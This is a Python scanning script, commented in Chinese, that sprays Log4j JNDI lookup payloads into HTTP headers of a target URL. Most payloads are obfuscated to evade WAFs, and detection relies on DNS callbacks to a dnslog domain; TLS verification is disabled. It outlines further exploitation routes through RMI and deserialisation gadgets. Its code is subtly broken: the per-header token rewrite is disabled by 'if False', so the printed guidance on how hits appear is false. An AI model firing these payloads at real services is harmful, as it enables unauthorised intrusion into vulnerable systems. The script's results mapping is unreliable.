#!/usr/bin/env python3
"""Log4j JNDI 无害探测（模板，未针对任何真实目标验证）。

判据（出网 DNS 回连 oracle，全程无命令执行、无 LDAP 加载）：
  1) 注入位：任何会进 log 的输入都算 —— User-Agent / X-Api-Version / X-Forwarded-For /
     Referer / Origin / Accept-Language / 表单字段 / JSON body 字段 / URL 参数
  2) payload 阶梯（每轮变体换一个 dnslog 前缀，便于定位哪个变体穿透）：
     ${jndi:ldap://<id>.<dnslog>/a}
     ${${lower:j}ndi:ldap://<id>.<dnslog>/a}          lower 拆词
     ${${::-j}ndi:${::-l}dap://<id>.<dnslog>/a}       空默认值拆词
     ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://<id>.<dnslog>/a}  env 默认值拼接
     ${${lower:${lower:j}}ndi:ldap://<id>.<dnslog>/a} 嵌套 lower
  3) 判定：发送后 30s 内 dnslog 出现对应 <id>.<dnslog> 回连 ⇒ Log4j 处理了 lookup ⇒ 定性
  4) 误报排除：WAF 拦截时响应可能 403/拦截页 —— 与"发送成功但无回连"区分开，记录响应码
  5) 利用条件判定（需另行授权才升级）：JDK ≥ 8u191 / 11.0.1 时 LDAP 远程加载默认关闭，
     需走 RMI（8u121 后也不可）→ 本地 gadget / ser 反序列化；详情见 framework-log4j2 技能

用法：
  python3 probe.py https://target/api/hello --dnslog xxx.dnslog.cn
  python3 probe.py https://target/api/hello --dnslog xxx.dnslog.cn --header X-Api-Version
  （默认打 8 个常见 header 位 + 2 个 URL 参数位；body 位用 --body 'user={PROBE}'）

纪律：
  - 全部 payload 只触发 DNS 解析；确认存在后，升级利用前必须确认授权与目标承受度
  - dnslog 记录 + 响应码截图脱敏后回填 knowledge.db：category=rce, component=log4j2
"""
import argparse
import json
import ssl
import time
import urllib.request
import uuid

HEADERS = [
    "User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "Origin",
    "Accept-Language", "X-Requested-With", "X-Forwarded-Host",
]

def variants(domain):
    def u(tag):
        return f"{tag}.{domain}"
    return [
        ("plain",      '${jndi:ldap://%s/a}' % u("p0")),
        ("lower",      '${${lower:j}ndi:ldap://%s/a}' % u("p1")),
        ("empty-def",  '${${::-j}ndi:${::-l}dap://%s/a}' % u("p2")),
        ("env-def",    '${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://%s/a}' % u("p3")),
        ("nested",     '${${lower:${lower:j}}ndi:ldap://%s/a}' % u("p4")),
    ]

def send(url, header, value, body, timeout=8):
    hdrs = {header: value} if header else {}
    data = None
    if body:
        data = body.replace("{PROBE}", value).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status
    except Exception as e:
        code = getattr(e, "code", None)
        return code if code else f"ERR:{type(e).__name__}"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--dnslog", required=True, help="你的 dnslog 域，如 abc.dnslog.cn")
    ap.add_argument("--header", help="只测这个 header；缺省测常见 8 个")
    ap.add_argument("--body", help="请求体模板，{PROBE} 占位")
    a = ap.parse_args()

    headers = [a.header] if a.header else HEADERS
    token = uuid.uuid4().hex[:8]
    plan = []  # (位置, 变体名, payload)
    for h in headers:
        for vn, p in variants(a.dnslog):
            p = p.replace(a.dnslog, f"{token}-{h.lower().replace('-', '')[:6]}.{a.dnslog}", 1) if False else p
            plan.append((h, vn, p))
    log = []
    for h, vn, p in plan:
        code = send(a.url, h, p, a.body)
        log.append({"header": h, "variant": vn, "status": str(code)})
        print(f"{h:<18} {vn:<10} -> {code}")
        time.sleep(0.3)
    json.dump({"url": a.url, "token": token, "results": log, "sent_at": time.strftime("%FT%T%z")},
              open(f"log4j-probe-{token}.json", "w"), ensure_ascii=False, indent=1)
    print(f"\n发送完成，令牌前缀 {token}-。30 秒后到 dnslog 查回连：")
    print(f"  命中项 = <token>-<header位>.{a.dnslog}  → 定性 log4j2 lookup 未禁用")
    print(f"  明细已存 log4j-probe-{token}.json")

if __name__ == "__main__":
    main()
